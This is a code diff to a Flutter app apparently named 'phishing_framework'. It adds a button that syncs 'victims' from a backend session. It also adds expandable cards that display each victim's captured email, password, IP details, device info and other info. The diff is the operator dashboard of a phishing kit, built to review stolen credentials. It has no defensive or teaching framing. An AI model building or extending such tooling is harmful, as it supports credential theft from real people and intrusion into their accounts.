@@ -2,6 +2,7 @@ import 'package:flutter/material.dart';
 import 'package:phishing_framework/attack.dart';
 import 'package:phishing_framework/app_scheme.dart';
 import 'package:phishing_framework/email_selector.dart';
+import 'package:phishing_framework/helpers/network_helper.dart';
 import 'package:phishing_framework/victim.dart';
 
 class PhishingHomePage extends StatefulWidget {
@@ -212,6 +213,27 @@ class _PhishingHomePageState extends State<PhishingHomePage> {
                   child: const Icon(Icons.delete_forever_outlined),
                 ),
               ),
+              Container(
+                width: 30,
+                height: 30,
+                margin: const EdgeInsets.all(10.0),
+                child: FloatingActionButton(
+                  heroTag: "sync_page",
+                  backgroundColor: AppScheme.primaryColor,
+                  onPressed: () async {
+                    Map<String, dynamic> m = Map<String, dynamic>.from(
+                      await Session.instance.getVictims(),
+                    );
+
+                    List<dynamic> victims = m["data"];
+                    
+                    setState(() {
+                        AttackManager.instance.syncAttacks(victims);
+                      });
+                  },
+                  child: const Icon(Icons.sync),
+                ),
+              ),
             ],
           ),
           DropdownMenu<String>(
@@ -251,15 +273,151 @@ SizedBox createVictimList(List<Victim> victims) {
       scrollDirection: Axis.vertical,
       itemCount: victims.length,
       itemBuilder: (context, index) {
-        return ListTile(
-          title: Text(
-            "email: ${victims[index].email}",
-          ),
-          subtitle: Text(
-            "password: ${victims[index].password}",
-          ),
-        );
+        return createVictimTile(victims[index], context);
       },
     ),
+  );
+}
+
+Card createVictimTile(Victim victim, context) {
+  return Card(
+    // child is a listtile that expands
+    child: ExpansionTile(
+      title: Text(victim.name),
+      children: [
+        SizedBox(
+          width: MediaQuery.of(context).size.width,
+          child: AppScheme.infoCard(
+            Column(
+              crossAxisAlignment: CrossAxisAlignment.start,
+              children: [
+                Text(
+                  "Email",
+                  style: TextStyle(
+                    color: AppScheme.headlineColor,
+                    fontSize: 15,
+                    fontWeight: FontWeight.w700,
+                  ),
+                ),
+                Text(
+                  victim.email,
+                  style: TextStyle(
+                    color: AppScheme.paragraphColor,
+                    fontSize: 15,
+                  ),
+                ),
+              ],
+            ),
+          ),
+        ),
+        SizedBox(
+          width: MediaQuery.of(context).size.width,
+          child: AppScheme.infoCard(
+            Column(
+              crossAxisAlignment: CrossAxisAlignment.start,
+              children: [
+                Text(
+                  "Password",
+                  style: TextStyle(
+                    color: AppScheme.headlineColor,
+                    fontSize: 15,
+                    fontWeight: FontWeight.w700,
+                  ),
+                ),
+                Text(
+                  victim.password,
+                  style: TextStyle(
+                    color: AppScheme.paragraphColor,
+                    fontSize: 15,
+                  ),
+                ),
+              ],
+            ),
+          ),
+        ),
+        SizedBox(
+          width: MediaQuery.of(context).size.width,
+          child: AppScheme.infoCard(
+            Column(
+              crossAxisAlignment: CrossAxisAlignment.start,
+              children: [
+                Text(
+                  "IP Details",
+                  style: TextStyle(
+                    color: AppScheme.headlineColor,
+                    fontSize: 15,
+                    fontWeight: FontWeight.w700,
+                  ),
+                ),
+                Text(
+                  victim.ipDetails.toString(),
+                  style: TextStyle(
+                    color: AppScheme.paragraphColor,
+                    fontSize: 15,
+                  ),
+                ),
+              ],
+            ),
+          ),
+        ),
+        SizedBox(
+          width: MediaQuery.of(context).size.width,
+          child: AppScheme.infoCard(
+            Column(
+              crossAxisAlignment: CrossAxisAlignment.start,
+              children: [
+                Text(
+                  "Device Info",
+                  style: TextStyle(
+                    color: AppScheme.headlineColor,
+                    fontSize: 15,
+                    fontWeight: FontWeight.w700,
+                  ),
+                ),
+                Text(
+                  victim.deviceDetails,
+                  style: TextStyle(
+                    color: AppScheme.paragraphColor,
+                    fontSize: 15,
+                  ),
+                ),
+              ],
+            ),
+          ),
+        ),
+        SizedBox(
+          width: MediaQuery.of(context).size.width,
+          child: AppScheme.infoCard(
+            Column(
+              crossAxisAlignment: CrossAxisAlignment.start,
+              children: [
+                Text(
+                  "Other Info",
+                  style: TextStyle(
+                    color: AppScheme.headlineColor,
+                    fontSize: 15,
+                    fontWeight: FontWeight.w700,
+                  ),
+                ),
+                Text(
+                  victim.otherInfo,
+                  style: TextStyle(
+                    color: AppScheme.paragraphColor,
+                    fontSize: 15,
+                  ),
+                ),
+              ],
+            ),
+          ),
+        ),
+      ],
+    ),
+  );
+}
+
+Padding tableText(String text) {
+  return Padding(
+    padding: const EdgeInsets.all(8.0),
+    child: Text(text),
   );
 }
